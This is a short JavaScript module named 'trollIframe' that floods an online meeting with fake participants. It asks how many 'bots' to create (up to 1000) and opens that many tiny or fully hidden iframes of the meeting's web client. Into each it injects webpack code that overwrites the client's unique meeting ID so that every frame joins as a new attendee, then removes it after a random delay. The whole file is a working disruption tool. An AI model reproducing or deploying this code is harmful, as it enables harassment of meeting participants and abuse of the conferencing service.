let offset = 0;

function trollIframe(invisible = false) {
    let amount = parseInt(prompt("How many bots?"), 10) || 5; 
    amount = Math.min(amount, 1000); 

    localStorage.clear();
    window.meetingURL = window.meetingURL || document.querySelector("#webclient").src;

    let container = document.createElement("div");
    container.style.display = "flex";
    container.style.flexWrap = "wrap";
    document.body.appendChild(container);

    const createIframe = (index) => {
        if (index >= amount) return; 

        let frame = document.createElement('iframe');
        frame.src = meetingURL;

        if (!invisible) {
            frame.style.width = "10px";
            frame.style.height = "10px";
            frame.style.border = "none";
            frame.style.margin = "5px";
            frame.style.resize = "both";
        } else {
            frame.style.width = "0%";
            frame.style.height = "0%";
            frame.style.display = "none";
        }

        container.appendChild(frame);

        let randomDelay = Math.floor(Math.random() * 10000) + 5000; 

        frame.onload = () => {

            setTimeout(() => {
                frame.remove();
            }, randomDelay);
        };

        let scope = frame.contentWindow;  
        (scope.webpackChunkwebclient = scope.webpackChunkwebclient || []).push([[Symbol()], {}, function (require) {
            require(22665).$c.webClient_meetingUqiueId = Math.random().toString(36).substring(2, 7);
        }]);

        setTimeout(() => createIframe(index + 1), 100); 
    };

    createIframe(0); 
}

export default trollIframe;